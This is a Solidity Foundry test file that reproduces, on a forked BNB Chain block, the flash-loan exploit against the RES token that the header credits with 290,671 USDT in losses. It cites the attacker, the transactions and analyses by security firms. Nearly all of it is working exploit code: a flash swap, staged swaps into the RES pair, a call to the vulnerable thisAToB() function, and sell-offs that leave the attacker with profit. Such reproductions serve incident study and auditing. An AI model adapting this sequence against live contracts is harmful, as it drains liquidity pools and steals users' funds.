// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : 290,671 USDT
// Attacker : 0x986b2e2a1cf303536138d8ac762447500fd781c6
// Attack Contract : https://bscscan.com/address/0xFf333DE02129AF88aAe101ab777d3f5D709FeC6f
// Vulnerable Contract : https://bscscan.com/address/0xeccd8b08ac3b587b7175d40fb9c60a20990f8d21
// Attack Txs :
//    - https://bscscan.com/tx/0xe59fa48212c4ee716c03e648e04f0ca390f4a4fc921a890fded0e01afa4ba96d
//    - https://bscscan.com/tx/0xef19a4dfd69874d5efda3e38b5a19cae4e0b0bdc95769760bd85ede4d15609ac

// @Info
// Vulnerable Contract Code : https://www.bscscan.com/address/0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21#code#L683

// @Analysis
// Twitter BlockSecTeam : https://twitter.com/BlockSecTeam/status/1578120337509662721
// Twitter Ancilia : https://x.com/AnciliaInc/status/1578119778446680064
// Article QuillAudits : https://quillaudits.medium.com/res-token-290k-flash-loan-exploit-quillaudits-9300657fff7b

interface IRES is IERC20 {
    function thisAToB() external;
}

contract ContractTest is Test {
    IUSDT constant USDT_TOKEN = IUSDT(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant ALL_TOKEN = IERC20(0x04C0f31C0f59496cf195d2d7F1dA908152722DE7);
    IPancakeRouter constant PS_ROUTER = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IPancakePair constant USDT_WBNB_PAIR = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    IPancakePair constant USDT_RES_PAIR = IPancakePair(0x05ba2c512788bd95cd6D61D3109c53a14b01c82A);
    IPancakePair constant USDT_ALL_PAIR = IPancakePair(0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb);
    IRES constant RES_TOKEN = IRES(0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21);

    function setUp() public {
        vm.createSelectFork("bsc", 21_948_016);
        // Adding labels to improve stack traces' readability
        vm.label(address(USDT_TOKEN), "USDT_TOKEN");
        vm.label(address(PS_ROUTER), "PS_ROUTER");
        vm.label(address(USDT_WBNB_PAIR), "USDT_WBNB_PAIR");
        vm.label(address(USDT_RES_PAIR), "USDT_RES_PAIR");
        vm.label(address(USDT_ALL_PAIR), "USDT_ALL_PAIR");
        vm.label(address(RES_TOKEN), "RES_TOKEN");
    }

    function stringsEquals(bytes calldata s1, string memory s2) private pure returns (bool) {
        bytes memory b1 = bytes(s1);
        bytes memory b2 = bytes(s2);

        uint256 l1 = b1.length;
        if (l1 != b2.length) return false;
        for (uint256 i = 0; i < l1; i++) {
            if (b1[i] != b2[i]) return false;
        }
        return true;
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "[Start] Attacker USDT balance before exploit", USDT_TOKEN.balanceOf(address(this)), 18
        );

        USDT_WBNB_PAIR.swap(10_014_120_886_666_860_414_836_616, 0, address(this), "borrowusdt");

        emit log_named_decimal_uint(
            "[End] Attacker USDT balance after exploit", USDT_TOKEN.balanceOf(address(this)), 18
        );
    }

    function pancakeCall(address, /*sender*/ uint256 amount0, uint256, /*amount1*/ bytes calldata data) external {
        if (stringsEquals(data, "borrowusdt")) {
            emit log_named_decimal_uint(
                "[Flashloan] now Attacker USDT balance is", USDT_TOKEN.balanceOf(address(this)), 18
            );

            USDT_TOKEN.approve(address(PS_ROUTER), type(uint256).max);

            address[] memory path = new address[](2);
            path[0] = address(USDT_TOKEN);
            path[1] = address(RES_TOKEN);

            emit log_named_decimal_uint(
                "[FlashLoan] Res Token Balance of address(user)",
                RES_TOKEN.balanceOf(address(0x3F693Effc53908d517F186A20431f756C90c2229)),
                8
            );

            USDT_TOKEN.transfer(address(USDT_RES_PAIR), 476_862_899_365_088_591_182_696);

            // use flashswap will get more than buy
            USDT_RES_PAIR.swap(0, 71_519_292_481_906, address(0x3F693Effc53908d517F186A20431f756C90c2229), "");

            console.log("[FlashLoan] swap 1 over");

            USDT_TOKEN.transfer(address(USDT_RES_PAIR), 953_725_798_730_177_182_365_392);

            USDT_RES_PAIR.swap(0, 22_030_478_307_020, address(0x3F693Effc53908d517F186A20431f756C90c2229), "");

            console.log("[FlashLoan] swap 2 over");

            USDT_TOKEN.transfer(address(USDT_RES_PAIR), 1_430_588_698_095_265_773_548_088);

            USDT_RES_PAIR.swap(0, 7_810_673_572_823, address(0x3F693Effc53908d517F186A20431f756C90c2229), "");

            console.log("[FlashLoan] swap 3 over");

            USDT_TOKEN.transfer(address(USDT_RES_PAIR), 1_907_451_597_460_354_364_730_784);

            USDT_RES_PAIR.swap(0, 3_504_534_400_905, address(0x3F693Effc53908d517F186A20431f756C90c2229), "");

            console.log("[FlashLoan] swap 4 over");

            USDT_TOKEN.transfer(address(USDT_RES_PAIR), 2_384_314_496_825_442_955_913_480);

            USDT_RES_PAIR.swap(0, 1_845_944_923_363, address(0x3F693Effc53908d517F186A20431f756C90c2229), "");

            console.log("[FlashLoan] swap 5 over");

            USDT_TOKEN.transfer(address(USDT_RES_PAIR), 2_861_177_396_190_531_547_096_176);

            USDT_RES_PAIR.swap(0, 1_084_945_873_965, address(0x3F693Effc53908d517F186A20431f756C90c2229), "");

            console.log("[FlashLoan] swap 6 over");

            // cost contract usd
            RES_TOKEN.thisAToB();

            // token can't support transfer to contract
            vm.prank(0x3F693Effc53908d517F186A20431f756C90c2229);
            RES_TOKEN.approve(address(this), type(uint256).max);

            vm.prank(0x3F693Effc53908d517F186A20431f756C90c2229);
            ALL_TOKEN.approve(address(this), type(uint256).max);

            uint256 res_balance = RES_TOKEN.balanceOf(address(0x3F693Effc53908d517F186A20431f756C90c2229));

            emit log_named_decimal_uint("[FlashLoan] Res Token Balance of address(user)", res_balance, 8);

            emit log_named_decimal_uint(
                "[FlashLoan] All Token Balance of address(user)",
                ALL_TOKEN.balanceOf(address(0x3F693Effc53908d517F186A20431f756C90c2229)),
                18
            );

            uint256 alltoken_balance = ALL_TOKEN.balanceOf(address(0x3F693Effc53908d517F186A20431f756C90c2229));

            ALL_TOKEN.transferFrom(0x3F693Effc53908d517F186A20431f756C90c2229, address(USDT_ALL_PAIR), alltoken_balance);

            console.log("transfer all token over");

            (uint256 reserve0, uint256 reserve1,) = USDT_ALL_PAIR.getReserves();

            uint256 get_value = (alltoken_balance * reserve1) / (alltoken_balance + reserve0);

            uint256 getusdamount = get_value - ((get_value * 10 / 10_000));

            USDT_ALL_PAIR.swap(0, getusdamount, address(this), "");

            emit log_named_decimal_uint(
                "[FlashLoan] sell Alltoken over, Attacker usdt balance is", USDT_TOKEN.balanceOf(address(this)), 18
            );

            RES_TOKEN.transferFrom(0x3F693Effc53908d517F186A20431f756C90c2229, address(USDT_RES_PAIR), res_balance);

            USDT_RES_PAIR.swap(1_905_851_854_454_828_201_052_166, 0, address(this), "");

            emit log_named_decimal_uint(
                "[FlashLoan] sell Restoken over, Attacker usdt balance is", USDT_TOKEN.balanceOf(address(this)), 18
            );

            uint256 refund = amount0 + ((amount0 * 251 / 100_000));
            USDT_TOKEN.transfer(address(USDT_WBNB_PAIR), refund);
        } else {
            console.log("error");
        }
    }

    receive() external payable {}
}
